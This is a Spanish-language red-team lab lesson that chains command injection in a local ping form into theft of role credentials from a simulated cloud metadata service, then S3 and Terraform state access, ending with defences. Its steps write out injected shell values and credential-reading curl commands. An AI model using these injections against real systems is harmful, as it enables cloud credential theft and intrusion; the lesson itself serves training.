# 15 - De RCE a credenciales cloud (IMDS falso + S3)

**Clase 4 · 30 min · M6 Cloud (AWS)**
**Fase:** descubrimiento de credenciales + movimiento lateral
**MITRE ATT&CK:** T1552.005 (Cloud Instance Metadata API), T1530 (Data from Cloud Storage)
**Riesgo OWASP CI/CD:** CICD-SEC-2 (identidad y acceso), CICD-SEC-5 (control de acceso del pipeline)

## Escenario

La app interna (`NetOps Console`) tiene un formulario que hace `ping` al host que
le pasas. Detras hay un `subprocess.run(..., shell=True)` con entrada del
usuario: command injection clasica. La app corre en un contenedor con un
metadata service simulado en `169.254.169.254`, igual que en un EC2/ECS real.

Objetivo: RCE -> credenciales temporales -> S3 -> state de Terraform. Es la
cadena completa de un compromiso cloud.

El contrapunto real es CVE-2026-112407: en AWS CICD-toolchain-for-serverless-
applications 1.0.7 a 1.0.10, un usuario con acceso de push podia escalar
privilegios y tocar recursos fuera del stack por una politica IAM demasiado
amplia. Aqui el salto viene del IMDS; alla, de la identidad que la propia
toolchain se concedio.

> Todo es local: la "nube" es `moto` en `localhost:4566` y el IMDS vive dentro
> del contenedor `webapp`. No se toca ninguna cuenta real.

## Objetivo de aprendizaje

- Confirmar el RCE y usarlo como proxy hacia el IMDS.
- Extraer credenciales temporales de un rol.
- Usarlas con la AWS CLI contra S3 y localizar el state del lab 14.

## Antes de empezar

```bash
cd devops-redteam
curl -s http://localhost:8000/health
```

**Que esperar:** `{"ok":true}`.

## Paso 1 - Confirmar el RCE

```bash
curl -s -G --data-urlencode 'host=127.0.0.1;id' http://localhost:8000/update \
  | grep -o 'uid=[^ <]*'
```

**Que esperar:** `uid=0(root)`. El `;` corta el `ping` y ejecuta `id`.

**Que demuestra:** el parametro `host` se concatena en un comando de shell. No
es un fallo teorico: estas ejecutando comandos en el contenedor.

## Paso 2 - Consultar el IMDS

```bash
curl -s -G --data-urlencode \
  'host=127.0.0.1;curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/' \
  http://localhost:8000/update
```

**Que esperar:** el `ping` y luego `"lab-role"`. La salida incluye el ruido del
`ping` porque el comando original se ejecuta antes del tuyo; busca la parte
final.

**Por que funciona:** el IMDS es link-local y solo responde desde el network
namespace del contenedor. Por eso hay que preguntar **desde dentro** (a traves
del RCE), no desde tu maquina.

## Paso 3 - Robar las credenciales del rol

```bash
curl -s -G --data-urlencode \
  'host=127.0.0.1;curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/lab-role' \
  http://localhost:8000/update
```

**Que esperar** (al final de la salida):

```json
{"Code": "Success", "Type": "AWS-HMAC",
 "AccessKeyId": "ASIAFAKELABACCESS",
 "SecretAccessKey": "fake-secret-key-for-moto",
 "Token": "fake-session-token",
 "Expiration": "2030-01-01T00:00:00Z"}
```

**Que demuestra:** has pasado de RCE en una app a identidad cloud. En AWS real
esas credenciales duran horas y permiten llamar a la API como el rol de la
instancia.

## Paso 4 - Usarlas contra S3

```bash
export AWS_ACCESS_KEY_ID=ASIAFAKELABACCESS
export AWS_SECRET_ACCESS_KEY=fake-secret-key-for-moto
export AWS_SESSION_TOKEN=fake-session-token
export AWS_DEFAULT_REGION=us-east-1

./tools/aws sts get-caller-identity
./tools/aws s3 ls
./tools/aws s3 cp s3://prod-artifacts/flag.txt -
```

**Que esperar:** la identidad de `moto`, los buckets `tfstate` y
`prod-artifacts`, y `FLAG{aws_s3_lateral}`.

`moto` acepta cualquier credencial, pero el flujo es el real: credenciales
temporales de un rol, acceso a buckets y movimiento lateral.

## Paso 5 - Pivotar al state de Terraform

```bash
./tools/aws s3 cp s3://tfstate/prod/terraform.tfstate - | head -c 400
```

**Que esperar:** el JSON del state, con `serial`, `resources` y
`terraform_version`. Ese objeto es el que se envenena en el lab 14.

**Por que importa:** el permiso de escritura en el bucket convierte un RCE en la
app en ejecucion dentro del pipeline de Terraform. La cadena es:
app -> IMDS -> credenciales -> S3 -> state -> `terraform plan` -> RCE en CI.

## Evidencia para el informe

- Peticion de `/update` con `;id` y salida.
- Respuesta del IMDS con `lab-role` y credenciales (redacta el secreto).
- `sts get-caller-identity`, `s3 ls` y el flag.
- Ruta del state y por que es un objetivo.

## Checkpoint

1. Por que el IMDS solo es alcanzable desde el contenedor?
2. Que diferencia hay entre credenciales de un rol y una access key fija?
3. Por que el atacante prefiere el state antes que la app?

## Defensa

- IMDSv2 obligatorio (token con `PUT` + `X-aws-ec2-metadata-token`) y hop limit 1.
- Bloquear `169.254.169.254` desde contenedores que no lo necesitan (network
  policy / firewall del nodo).
- Rol de instancia con permisos minimos; nunca acceso amplio a S3.
- Buckets de state y artefactos con policies estrictas y cifrado.
- Detectar `curl` a link-local desde procesos de aplicacion (Falco, EDR).
- Workload identity/OIDC en vez de credenciales de larga duracion.
- Corregir el RCE: nada de `shell=True` con entrada del usuario.
